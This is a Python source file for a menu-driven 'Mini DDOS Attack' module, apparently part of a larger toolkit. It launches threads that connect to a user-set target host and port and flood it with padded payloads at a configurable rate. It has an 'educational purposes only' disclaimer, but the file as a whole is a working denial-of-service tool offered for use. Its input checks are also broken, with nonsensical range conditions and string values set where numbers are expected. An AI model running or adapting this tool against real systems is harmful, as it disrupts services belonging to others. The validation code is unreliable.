import threading
import time
import socket
import sys
from config import config
from util import print_feature_header

def send_packet():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((config.TARGET_HOST, config.TARGET_PORT))
        payload = b'A' * config.PAYLOAD_SIZE
        sock.sendall(payload)
        sock.close()
    except Exception as e:
        response_time = str(e)
        return response_time

def mini_ddos():
    print_feature_header("Mini DDOS Attack")

    try:
        num_threads = int(input(f"Enter the number of threads (1 - {config.MAX_THREADS}): ").strip())
        if num_threads < 1 or num_threads > config.MAX_THREADS:
            print(f"[Error] Invalid number! Must be between 1 and {config.MAX_THREADS}.")
            return
    except ValueError:
        print("[Error] Please enter a valid number.")
        return
    
    print("\n⚠️  **WARNING** ⚠️  High thread count may cause CPU overlaod!")
    print(f"[Info] You are about to start a DDOS attack with {config.PAYLOAD_SIZE} bytes of payload.")
    print(f"[Info] Targeting {config.TARGET_HOST}:{config.TARGET_PORT} with {num_threads} threads.")
    print(f"[Info] Request rate is set to {config.REQUEST_RATE} requests per second.")
    print(f"[Info] the total number of packets sent will be {num_threads * config.REQUEST_RATE} packets.")
    s = input("Enter \"quit\" to exit, Press Enter to continue...")
    if s.lower() == "quit":
        print("[Info] Exiting Mini DDOS Attack.")
        return
    
    print("\n[Info] Starting Mini DDOS Attack...")
    threads = []
    start_time = time.time()
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packet)
        threads.append(thread)
        thread.start()
        time.sleep(1 / config.REQUEST_RATE)
    
    for thread in threads:
        thread.join()
    
    total_time = time.time() - start_time
    print(f"[Info] Mini DDOS Attack completed in {total_time:.2f} seconds.")

def config_menu():
    print("\n0. Modify Max Threads")
    print("1. Modify Request Rate")
    print("2. Modify Payload Size")
    print("3. Modify Target Host/Port")
    print("4. Return to Mini DDOS Menu")
    print("5. Exit")
    print("----------------------------------")
    choice = input("Select an option (0-5): ").strip()
    if choice == "0":
        new_threads = int(input(f"Enter new MAX_THREADS (Current: {config.MAX_THREADS}): ").strip())
        if new_threads == "" or 0 >= new_threads <= 50:
            new_threads = "5" 
            print("[Info] The MAX_THREADS must be between 0 and 100")
        config.update_config(max_threads=new_threads)
        print(f"[Info] MAX_THREADS updated to {new_threads}.")
    elif choice == "1":
        new_rate = int(input(f"Enter new REQUEST_RATE (Current: {config.REQUEST_RATE}): ").strip())
        if new_rate == "" or 0 >= new_rate <= 100:
            new_rate = "5" 
            print("[Info] The REQUEST_RATE must be between 0 and 100")
        config.update_config(request_rate=new_rate)
        print(f"[Info] REQUEST_RATE updated to {new_rate}.")
    elif choice == "2":
        new_payload = int(input(f"Enter new PAYLOAD_SIZE (Current: {config.PAYLOAD_SIZE}): ").strip())
        if new_payload == "" or 0 >= new_payload <= 10000:
            new_payload = "5" 
            print("[Info] The payload_size must be between 0 and 10000")
        config.update_config(payload_size=new_payload)
        print(f"[Info] PAYLOAD_SIZE updated to {new_payload}.")
    elif choice == "3":
        new_host = input(f"Enter new TARGET_HOST (Current: {config.TARGET_HOST}): ").strip()
        new_port = input(f"Enter new TARGET_PORT (Current: {config.TARGET_PORT}): ").strip()
        if new_port.isdigit():
            new_port = int(new_port)
        else:
            new_port = 80
        if new_host == "" or len(new_host) < 8: new_host = "127.0.0.1"
        config.update_config(target_host=new_host, target_port=new_port)
        print(f"[Info] TARGET_HOST updated to {new_host} and TARGET_PORT updated to {new_port}.")
    elif choice == "4":
        print("[Info] Returning to Mini DDOS Menu.")
        return
    elif choice == "5":
        print("[Info] Exiting Program. Goodbye!")
        sys.exit(0)
    else:
        print("[Error] Invalid option. Please try again!")
        time.sleep(2)
        modify_config()

def modify_config():
    print_feature_header("Modify Mini DDOS Configuration")
    config.show_config(mode="mini_ddos")
    config_menu()

def display_info():
    print_feature_header("Mini DDOS Attack Info")
    print("This feature is designed to demonstrate a simple DDOS attack simulation.")
    print("⚠️ **WARNING** ⚠️ This is for educational purposes only. Do not use it against any unauthorized systems.")
    print("Ensure you have permission to test the target system.")
    print("\nNote:\n")
    print("    High Thread count may cause CPU overload.")
    print("    Use responsibly and ethically.")
    print("-" * 40)
    input("Press Enter to continue...")

def main():
    while True:
        try:
            print_feature_header("Mini DDOS Attack")
            print("0. Get info about this feature")
            print("1. Start Mini DDOS Attack")
            print("2. Modify Mini DDOS Configuration")
            print("3. Return to Main Menu")
            print("4. Exit")
            print("----------------------------------")

            choice = input("Select an option (0-4): ").strip()
            if choice == "0":
                display_info()
            elif choice == "1":
                mini_ddos()
            elif choice == "2":
                modify_config()
            elif choice == "3":
                print("[Info] Returning to Main Menu.")
                return
            elif choice == "4":
                print("Exiting program. Goodbye!")
                sys.exit(0)
            else:
                print("[Error] Invalid option. Please try again!")
                time.sleep(2)
                continue
        except KeyboardInterrupt:
            print("\n[Warning] Please use option 4 to exit!\n")
            time.sleep(2)

if __name__ == "__main__":
    main()